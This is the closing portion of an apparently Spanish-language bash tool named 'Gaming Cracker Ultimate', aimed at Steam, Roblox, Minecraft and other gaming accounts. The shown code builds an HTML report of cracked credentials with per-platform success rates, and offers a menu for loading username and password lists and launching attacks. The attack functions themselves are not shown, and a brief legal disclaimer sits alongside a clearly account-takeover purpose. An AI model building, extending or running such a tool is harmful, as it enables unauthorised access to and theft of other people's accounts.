            color: #00ff41; 
            margin: 20px; 
        }
        .header { 
            text-align: center; 
            border: 2px solid #00ff41; 
            padding: 20px; 
            margin-bottom: 20px;
            background: rgba(0,255,65,0.1);
            border-radius: 10px;
        }
        .section { 
            border: 1px solid #444; 
            padding: 15px; 
            margin: 10px 0; 
            background: rgba(42,42,42,0.8);
            border-radius: 5px;
        }
        .success { color: #00ff41; font-weight: bold; }
        .warning { color: #ffff00; }
        .error { color: #ff4444; }
        .platform { color: #44ff44; }
        pre { 
            background: #111; 
            padding: 10px; 
            overflow-x: auto; 
            border: 1px solid #444;
            border-radius: 5px;
        }
        .gaming-icon { font-size: 2em; }
    </style>
</head>
<body>
    <div class="header">
        <div class="gaming-icon">🎮🔥🎯</div>
        <h1>GAMING CRACKER ULTIMATE</h1>
        <h2>📊 Reporte de Cracking Gaming</h2>
        <p>Generado: $(date)</p>
        <p>Directorio: $WORKDIR</p>
    </div>

    <div class="section">
        <h3>🎮 PLATAFORMAS ATACADAS</h3>
        <ul>
EOF

    # Listar plataformas atacadas
    if ls "$WORKDIR/platforms"/*.txt >/dev/null 2>&1; then
        for platform_file in "$WORKDIR/platforms"/*.txt; do
            platform_name=$(grep "PLATFORM:" "$platform_file" | cut -d: -f2)
            platform_display=$(grep "NAME:" "$platform_file" | cut -d: -f2)
            echo "            <li class=\"platform\">🎯 $platform_display ($platform_name)</li>" >> "$report_file"
        done
    fi

    cat >> "$report_file" << EOF
        </ul>
    </div>

    <div class="section">
        <h3>🏆 CREDENCIALES ENCONTRADAS</h3>
        <pre class="success">
EOF

    # Mostrar credenciales exitosas
    if ls "$WORKDIR/results"/*.txt >/dev/null 2>&1; then
        for result_file in "$WORKDIR/results"/*.txt; do
            platform=$(basename "$result_file" | cut -d'_' -f1)
            echo "=== $platform ===" >> "$report_file"
            grep "SUCCESS" "$result_file" 2>/dev/null | head -10 >> "$report_file" || echo "Sin éxitos" >> "$report_file"
            echo "" >> "$report_file"
        done
    else
        echo "No se encontraron credenciales exitosas" >> "$report_file"
    fi

    cat >> "$report_file" << EOF
        </pre>
    </div>

    <div class="section">
        <h3>📊 ESTADÍSTICAS</h3>
        <table style="width:100%; border-collapse: collapse;">
            <tr style="border: 1px solid #444;">
                <th style="border: 1px solid #444; padding: 8px; background: #333;">Plataforma</th>
                <th style="border: 1px solid #444; padding: 8px; background: #333;">Ataques</th>
                <th style="border: 1px solid #444; padding: 8px; background: #333;">Éxitos</th>
                <th style="border: 1px solid #444; padding: 8px; background: #333;">Tasa Éxito</th>
            </tr>
EOF

    # Generar estadísticas por plataforma
    if ls "$WORKDIR/results"/*.txt >/dev/null 2>&1; then
        for result_file in "$WORKDIR/results"/*.txt; do
            platform=$(basename "$result_file" | cut -d'_' -f1)
            total_attempts=$(grep -c ":" "$result_file" 2>/dev/null || echo "0")
            successful_attempts=$(grep -c "SUCCESS" "$result_file" 2>/dev/null || echo "0")
            
            if [[ $total_attempts -gt 0 ]]; then
                success_rate=$(echo "scale=2; $successful_attempts * 100 / $total_attempts" | bc 2>/dev/null || echo "0")
            else
                success_rate="0"
            fi
            
            echo "            <tr style=\"border: 1px solid #444;\">" >> "$report_file"
            echo "                <td style=\"border: 1px solid #444; padding: 8px;\">$platform</td>" >> "$report_file"
            echo "                <td style=\"border: 1px solid #444; padding: 8px;\">$total_attempts</td>" >> "$report_file"
            echo "                <td style=\"border: 1px solid #444; padding: 8px; color: #00ff41;\">$successful_attempts</td>" >> "$report_file"
            echo "                <td style=\"border: 1px solid #444; padding: 8px;\">$success_rate%</td>" >> "$report_file"
            echo "            </tr>" >> "$report_file"
        done
    fi

    cat >> "$report_file" << EOF
        </table>
    </div>

    <div class="section">
        <h3>⚠️ CONSIDERACIONES LEGALES</h3>
        <div class="warning">
            <p><strong>IMPORTANTE:</strong></p>
            <ul>
                <li>Este reporte es para fines educativos y pentesting autorizado únicamente</li>
                <li>El acceso no autorizado a cuentas gaming es ILEGAL</li>
                <li>Todas las plataformas gaming tienen términos de servicio estrictos</li>
                <li>Use esta información responsablemente</li>
            </ul>
        </div>
    </div>

    <div class="section">
        <h3>🔗 ARCHIVOS GENERADOS</h3>
        <ul>
            <li>📁 Directorio principal: <code>$WORKDIR</code></li>
            <li>📜 Log principal: <code>$LOG_FILE</code></li>
            <li>📊 Reporte: <code>$report_file</code></li>
            <li>🎯 Resultados: <code>$WORKDIR/results/</code></li>
        </ul>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}✅ Reporte generado: $report_file${NC}"
    echo -e "${CYAN}📂 Abre el archivo en un navegador para ver el reporte completo${NC}"
}

# Menú principal
mostrar_menu() {
    clear
    echo "
 ██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔══██╗████╗ ████║██║████╗  ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ███╗███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║   ██║██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                               
🎮 GAMING ACCOUNTS CRACKER - STEAM, ROBLOX, MINECRAFT Y MÁS 🎮
"

    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🎯 MENÚ PRINCIPAL${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo ""
    echo "1) 🎮 Gestionar plataformas gaming"
    echo "2) 👥 Gestionar usuarios gaming"
    echo "3) 🔐 Gestionar contraseñas gaming"
    echo "4) ⚔️ Ejecutar ataques"
    echo "5) 📊 Generar reporte"
    echo "6) 🔧 Ver configuración"
    echo "7) 🧹 Limpiar archivos temporales"
    echo "8) ❌ Salir"
    echo ""
    echo -e "${YELLOW}Directorio actual: $WORKDIR${NC}"
    echo -e "${GREEN}Plataformas configuradas: $(ls "$WORKDIR/platforms"/*.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${GREEN}Ataques completados: $(ls "$WORKDIR/results"/*.txt 2>/dev/null | wc -l)${NC}"
    echo ""
}

# Función principal
main() {
    echo -e "${BLUE}🔧 Inicializando Gaming Cracker Ultimate...${NC}"
    
    verificar_herramientas
    configurar_directorio
    
    while true; do
        mostrar_menu
        read -p "Selecciona opción [1-8]: " opcion
        
        case $opcion in
            1) gestionar_plataformas ;;
            2) gestionar_usuarios_gaming ;;
            3) gestionar_passwords_gaming ;;
            4) ejecutar_ataques ;;
            5) generar_reporte_gaming ;;
            6)
                echo -e "${CYAN}⚙️ CONFIGURACIÓN ACTUAL${NC}"
                echo "Directorio: $WORKDIR"
                echo "Log: $LOG_FILE"
                echo "Python: $(which python3)"
                echo "Curl: $(which curl)"
                echo "Plataformas: $(ls "$WORKDIR/platforms"/*.txt 2>/dev/null | wc -l)"
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                echo -e "${YELLOW}🧹 Limpiando archivos temporales...${NC}"
                find "$WORKDIR" -name "*.tmp" -delete 2>/dev/null || true
                find "$WORKDIR" -name "*.pyc" -delete 2>/dev/null || true
                echo -e "${GREEN}✅ Limpieza completada${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                echo -e "${GREEN}👋 ¡Game Over! Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
        esac
    done
}

# Verificar permisos
if [[ $EUID -eq 0 ]]; then
    echo -e "${YELLOW}⚠️ Ejecutándose como root${NC}"
fi

# Ejecutar función principal
main "$@"